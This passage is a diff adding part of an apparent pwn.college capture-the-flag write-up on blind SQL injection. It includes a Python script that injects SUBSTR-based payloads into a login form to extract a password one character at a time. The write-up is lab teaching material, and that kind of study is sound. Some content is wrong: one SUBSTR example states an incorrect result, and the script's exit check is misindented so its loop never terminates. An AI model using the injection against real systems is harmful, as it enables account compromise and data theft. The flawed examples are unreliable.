@@ -603,3 +603,77 @@ def level7():
 
     return form(["username", "password"])
 ```
+
+We can see that out input data is being inserted within the SQL query.
+
+```
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+```
+
+However, this level does not print out the flag onto the screen, instead it prints out a `Hello, {username}!` message.
+
+### SQL Injection
+
+In order to retrieve the flag, we first need to perform a Blind SQL Injection.
+
+#### Blind attack
+
+Before we perform the attack we need to learn more about the `SUBSTR()` function.
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/ec609e62-def0-46f2-b58a-cb7d332e11ca)
+
+```
+## Extract the one character from the string starting at the first position
+SUBSTR("pwn.college", 1, 1)
+
+## Result:
+p
+```
+
+```
+## Extract the one character from the string starting at the second position
+SUBSTR("pwn.college", 2, 1)
+
+## Result:
+w
+```
+
+```
+## Extract the one character from the string starting at the third position
+SUBSTR("pwn.college", 1, 3)
+
+## Result:
+n
+```
+
+Now we have to write a script that loops over and checks the next byte with a set of characters.
+
+We also need to create an empty string.
+If the script finds the `Hello, {username}!` message, within the response, it will append the character to the flag string.
+
+```py
+import string
+import requests
+
+searchspace = string.ascii_letters + string.digits + '{}._-'
+solution = ''
+
+while True:
+    found = False
+    for char in searchspace:
+        data = {
+            "username": f'" OR SUBSTR(password, {len(solution)+1}, 1) = \'{char}\' --',
+            "password": 'flag'
+        }
+       
+        response = requests.post("http://challenge.localhost/", data=data)
+       
+        if response.text.startswith("Hello"):
+            solution += char
+            print(solution)
+            found = True
+            break
+    
+if not found:
+        break
+```
